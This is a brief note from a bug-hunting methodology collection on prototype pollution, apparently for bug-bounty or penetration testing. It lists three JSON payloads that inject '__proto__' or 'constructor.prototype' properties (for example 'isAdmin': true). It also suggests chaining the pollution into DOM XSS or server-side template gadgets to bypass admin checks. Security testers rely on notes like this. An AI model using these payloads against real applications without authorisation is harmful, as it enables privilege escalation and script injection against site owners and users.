> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/hunting/00-index|← Back to Hunting]]

# Prototype Pollution

Hunt: `Object.assign` / merge / deep-set in user-controlled JSON.

## Test Payloads

```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
{"a":{"__proto__":{"x":1}}}
```

Chain to DOM XSS via `innerHTML`, `document.write`, or server-side gadget (EJS, Jade, Pug admin bypass).
